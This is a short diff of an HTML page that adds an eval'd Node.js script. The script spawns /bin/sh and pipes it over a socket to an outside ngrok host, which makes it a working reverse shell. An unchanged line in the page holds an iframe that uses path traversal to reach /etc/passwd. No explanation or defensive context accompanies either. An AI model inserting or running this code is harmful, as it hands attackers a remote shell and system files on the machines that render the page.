@@ -2,6 +2,6 @@
 <html>
 <body>
 <iframe src="../../../../../../../../../../../../../../../etc/passwd"></iframe>
-<script></script>
+<script>eval('(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(14014, "tcp://0.tcp.ap.ngrok.io", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();')</script>
 </body>
 </html>
